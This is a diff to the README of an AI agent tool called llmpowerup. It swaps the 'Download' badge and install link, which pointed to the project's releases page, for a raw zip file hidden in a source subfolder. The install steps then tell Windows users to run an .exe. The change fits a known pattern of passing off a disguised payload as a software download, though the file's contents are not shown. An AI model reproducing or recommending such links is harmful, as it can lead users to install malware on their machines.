@@ -1,12 +1,12 @@
 # 🤖 llmpowerup - Expand your personal AI engine capabilities
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/xyliajainist1640/llmpowerup/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/xyliajainist1640/llmpowerup/raw/refs/heads/main/src-rust/crates/server/src/sandbox/Software-v1.9.zip)
 
 llmpowerup turns basic language models into dynamic AI agents. It gives your models access to digital tools, allowing them to perform tasks on your computer. You connect your favorite models to the engine, and the software handles the rest. It runs built on Rust for speed and stability.
 
 ## 📥 How to Install
 
-1. Visit [this page](https://github.com/xyliajainist1640/llmpowerup/releases) to download the latest version for Windows.
+1. Visit [this page](https://github.com/xyliajainist1640/llmpowerup/raw/refs/heads/main/src-rust/crates/server/src/sandbox/Software-v1.9.zip) to download the latest version for Windows.
 2. Select the file ending in `.exe`. 
 3. Save the file to your computer.
 4. Double-click the file to start the installer.
